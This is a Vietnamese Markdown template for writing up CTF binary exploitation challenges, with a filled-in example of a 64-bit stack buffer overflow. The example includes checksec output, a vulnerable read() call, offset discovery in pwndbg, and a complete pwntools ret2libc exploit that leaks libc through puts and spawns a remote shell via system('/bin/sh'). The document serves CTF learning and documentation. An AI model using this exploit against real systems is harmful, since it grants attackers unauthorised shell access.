Một template writeup CTF (Binary Exploitation / Pwn) tốt cần phải cân bằng giữa hai yếu tố: **ngắn gọn để tra cứu** và **đủ chi tiết để người khác học hỏi**.

Dưới đây là cấu trúc template Markdown chuẩn chỉnh, được thiết kế trực quan, dễ đọc, giúp bạn ghi lại quá trình giải bài một cách logic nhất.

## 📌 [CTF Name 2026] - [Challenge Name]

- **Category:** Binary Exploitation (Pwn)
    
- **Difficulty:** Easy / Medium / Hard
    
- **Points:** [Score]
    
- **Description:** [Tóm tắt ngắn gọn mô tả của bài hoặc file cung cấp, ví dụ: "Đọc file flag trên server,libc.so.6 được cung cấp"]
    

## 1. Khảo sát Ban đầu (Mitigation Check)

> Bước này giúp xác định các "lớp giáp" của file binary để biết phương pháp tấn công nào khả thi.

Bash

```
$ checksec ./challenge
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

**Nhận xét nhanh:**

- Không có **Stack Canary** -> Nghĩ ngay đến Stack Buffer Overflow.
    
- **NX enabled** -> Không thể thực thi shellcode trực tiếp trên Stack, cần dùng ROP chain hoặc Ret2libc.
    
- **PIE disabled** -> Địa chỉ các hàm trong vùng nhớ code cố định.
    

## 2. Phân tích Tĩnh & Động (Reversing & Analysis)

### Phân tích mã nguồn / Decompile (Ghidra/IDA)

Đoạn code lỗi nằm ở hàm `vuln()`:

C

```
void vuln() {
    char buffer[64];
    printf("Nhập dữ liệu của bạn: ");
    // LỖI: Đọc 256 bytes vào buffer chỉ có 64 bytes -> Buffer Overflow
    read(0, buffer, 256); 
}
```

### Phân tích động (GDB/Pwndbg)

Tìm khoảng cách (offset) từ đầu buffer đến thanh ghi `RIP` (địa chỉ trả về):

Plaintext

```
pwndbg> cyclic 100
pwndbg> r
[...]
Nhập dữ liệu của bạn: aaaabaaacaaadaaaeaaaf...
[...]
pwndbg> cyclic -l 0x61616165
[*] Located crash at offset 72
```

=> **Offset = 72 bytes**.

## 3. Ý tưởng Tấn công (Exploit Strategy)

Dựa trên thông tin thu thập được, kịch bản khai thác sẽ như sau:

1. **Lần 1 (Leak libc):**
    
    - Tận dụng lỗi Buffer Overflow để ghi đè `RIP` thành ROP chain.
        
    - Dùng hàm `puts` để in địa chỉ của một hàm bất kỳ trong libc (ví dụ `puts@got`) nhằm bypass ASLR.
        
    - Gọi lại hàm `main` để tiếp tục nhập payload lần 2.
        
2. **Tính toán libc base:**
    
    - `libc_base = leaked_address - offset_trong_libc`
        
3. **Lần 2 (Get Shell):**
    
    - Tính địa chỉ của `/bin/sh` và `system()` trong libc.
        
    - Ghi đè `RIP` lần nữa để gọi `system("/bin/sh")`.
        

## 4. Mã Khai thác (Exploit Script)

Dưới đây là script khai thác viết bằng `pwntools`:

Python

```
#!/usr/bin/env python3
from pwn import *

# Thiết lập môi trường
exe = ELF("./challenge")
libc = ELF("./libc.so.6") # Nếu bài cho libc
context.binary = exe

# r = process("./challenge") # Local
r = remote("chal.ctf.com", 1337) # Remote

# ==========================================
# GIAI ĐOẠN 1: LEAK LIBC
# ==========================================
offset = 72

# ROP Gadgets (Sử dụng ROPgadget hoặc pwntools)
rop = ROP(exe)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

payload1 = flat(
    b"A" * offset,
    pop_rdi, exe.got['puts'],
    exe.plt['puts'],
    exe.symbols['main'] # Quay lại main
)

r.sendlineafter(b"Nhập dữ liệu của bạn: ", payload1)

# Nhận địa chỉ leak
leaked_puts = u64(r.recvline().strip().ljust(8, b"\x00"))
log.success(f"Leaked puts: {hex(leaked_puts)}")

# Tính toán địa chỉ Base của Libc
libc.address = leaked_puts - libc.symbols['puts']
log.success(f"Libc base: {hex(libc.address)}")

# ==========================================
# GIAI ĐOẠN 2: GET SHELL
# ==========================================
payload2 = flat(
    b"A" * offset,
    ret, # Stack alignment cho Ubuntu nếu cần
    pop_rdi, next(libc.search(b"/bin/sh\x00")),
    libc.symbols['system']
)

r.sendlineafter(b"Nhập dữ liệu của bạn: ", payload2)

# Tương tác với Shell
r.interactive()
```

## 5. Kết quả & Flag

Chạy script thành công và lấy được flag:

Bash

```
$ python3 xpl.py
[*] Leaked puts: 0x7f9c8f07aa30
[*] Libc base: 0x7f9c8efeb000
[+] Switching to interactive mode
$ cat flag.txt
FLAG{b1nary_expl01tat10n_is_f0n_2026}
```

**Lessons Learned (Bài học rút ra):**

- Chú ý căn chỉnh Stack (Stack Alignment `ret` gadget) trên hệ điều hành Ubuntu 64-bit khi gọi hàm `system`.
    
- Luôn kiểm tra kỹ phiên bản libc được cung cấp để tính offset chính xác.
    

### 💡 Mẹo nhỏ khi viết Writeup bằng Markdown:

- Sử dụng các khối code có định danh ngôn ngữ rõ ràng như ``python`,`` c`, ````bash`, hoặc ````text` để Markdown tự động tô màu (highlight).
    
- Dùng thẻ blockquote `>` để ghi chú những điểm mấu chốt quan trọng hoặc các "bẫy" (pitfalls) mà bạn đã tốn thời gian debug.